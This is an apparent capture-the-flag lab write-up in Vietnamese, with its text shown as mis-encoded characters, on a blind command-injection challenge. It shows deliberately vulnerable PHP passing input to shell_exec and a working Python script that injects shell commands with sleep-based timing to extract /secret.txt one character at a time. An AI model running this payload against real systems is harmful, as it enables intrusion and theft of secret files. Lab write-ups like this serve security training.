# Command Injection Level 7

## __1. Sá»­ dá»¥ng nhÆ° ngÆ°á»i dÃ¹ng:__
á» lv7 cÅ©ng Ä‘Ã£ cháº·n nhÆ° á»Ÿ lv6 vÃ  dÃ¹ng Payload á»Ÿ lv6 cÅ©ng khÃ´ng Ä‘Æ°á»£c.  
Giao diá»‡n cÃ³ 1 chÃºt thay Ä‘á»•i.  
![](1.PNG)  
Khi cháº¡y thÃ¬ luÃ´n tráº£ vá» "___ÄÃ£ cháº¡y cÃ¢u lá»‡nh backup___" khÃ´ng cÃ²n cháº¡y Ä‘Æ°á»£c hay khÃ´ng cháº¡y Ä‘Æ°á»£c nhÆ° trÆ°á»›c ná»¯a.

## __2. Xem Ä‘áº±ng sau chÆ°Æ¡ng trÃ¬nh:__
- File `index.php`: CÃ³ sá»± thay Ä‘á»•i
```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
                # Backup to /tmp/ folder and prevent writable to document root 
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                die("ÄÃ£ cháº¡y cÃ¢u lá»‡nh backup");
                break;
            // CHANGELOG: Báº£o trÃ¬
			// case "ping":
			// 	$result = shell_exec("timeout 10 ping -c 4 $target &2 > 1");
			// 	break;
			// case "nslookup":
			// 	$result = shell_exec("timeout 10 nslookup $target &2 > 1");
			// 	break;	
			// case "dig":
			// 	$result = shell_exec("timeout 10 dig $target &2 > 1");
			// 	break;
		}
        die("Má»™t sá»‘ chá»©c nÄƒng Ä‘ang Ä‘Æ°á»£c báº£o trÃ¬. Má»i báº¡n náº¡p tiá»n Ä‘á»ƒ cÃ³ thá»ƒ tiáº¿p tá»¥c duy trÃ¬ dá»± Ã¡n");
    }
?>
```
ÄÃºng nhÆ° Ä‘Ã£ dá»± Ä‘oÃ¡n á»Ÿ pháº§n sá»­ dá»¥ng thÃ¬ lÃºc nÃ y anh Dev Ä‘Ã£ khÃ´ng cÃ²n tráº£ vá» káº¿t quáº£ `output` lÃºc cháº¡y lá»‡nh command mÃ  chá»‰ tráº£ vá» "___ÄÃ£ cháº¡y cÃ¢u lá»‡nh backup___" vá»›i báº¥t kÃ¬ káº¿t quáº£ nÃ o.

## __3. LÃªn Ã½ tÆ°á»Ÿng vÃ  Khai thÃ¡c:__
### a. <ins>Ã tÆ°á»Ÿng</ins>:
á» thá»±c táº¿ khi mÃ¬nh lÃ m gÃ¬ cÃ³ lá»—i mÃ  mÃ¬nh khÃ´ng biáº¿t mÃ¬nh Ä‘Ã£ lÃ m gÃ¬ Ä‘á»ƒ bá»‹ ngÆ°á»i yÃªu giáº­n thÃ¬ mÃ¬nh sáº½ lÃ m gÃ¬ Ä‘á»ƒ biáº¿t Ä‘Æ°á»£c lá»—i nhá»‰? MÃ¬nh sáº½ Ä‘i há»i ngÆ°á»i yÃªu vá» cÃ¡c lá»—i cÃ³ thá»ƒ mÃ¬nh máº¯c pháº£i vÃ  lÃºc nÃ y sáº½ cÃ³ 2 trÆ°á»ng há»£p xáº£y ra:
- Náº¿u `sai`: thÃ¬ ngÆ°á»i yÃªu sáº½ tráº£ lá»i `khÃ´ng pháº£i`.
- Náº¿u `Ä‘Ãºng`: thÃ¬ ngÆ°á»i yÃªu váº«n sáº½ tráº£ lá»i `khÃ´ng pháº£i` nhÆ°ng sáº½ cÃ³ 1 khoáº£ng thá»i gian Ä‘á»ƒ tráº£ lá»i &rarr; tÃ­n hiá»‡u cá»§a vÅ© trá»¥ cho ráº±ng cÃ³ thá»ƒ lÃ  lá»—i nÃ y lÃ m ngÆ°á»i yÃªu cá»§a báº¡n giáº­n (cÃ³ váº» lÃ  váº­y thÃ´i vÃ¬ Ä‘Ã¢y chá»‰ lÃ  lÃ½ thuyáº¿t ğŸ¤¡)

Váº­y mÃ¬nh cÅ©ng sáº½ dÃ¹ng cÃ¡ch nÃ y Ä‘á»ƒ Ä‘Æ°a vÃ o khai thÃ¡c lá»—i.

### b. <ins>Khai thÃ¡c</ins>:
__Payload:__
```python
import requests as rq
import time

# create array of strings
array = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","0", "1", "2", "3", "4", "5", "6", "7", "8", "9","a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","!", "@", "#", "_",  "%", "&", "", "(", ")", "+", "=", "|", "\"", "}", "{", "]", "[", ":", ";", "'", "\"", ",", "<", ".", ">", "/", "?", "~", "`", " "]

mydata = {'command': 'backup', 'target': '111;echo $(cat /secret.txt) | cut -c1 | grep "C" && sleep 1;'}
url='http://localhost:1006/'
# def function post request with command and taget parameter in url and return time of response
def send_request_with_param_post(url, data):
    start = time.time()
    rq.post(url, data)
    end= time.time()
    return end - start

flag=""

for i in range(1,40):
    #foreach array element
    for j in array:
        #create new data with command and target parameter
        mydata = {'command': 'backup', 'target': '111;echo $(cat /secret*.txt) | cut -c'+str(i)+' | grep '+j+' && sleep 1;'}
        #send request with new data
        rt=time.strftime("%S", time.gmtime(send_request_with_param_post(url, mydata)))
        if(rt>="01"):
            flag+=j
            print(flag)
            break
```
![](2.PNG)
> CBJS{FAKE_FLAG_FAKE_FLAG}

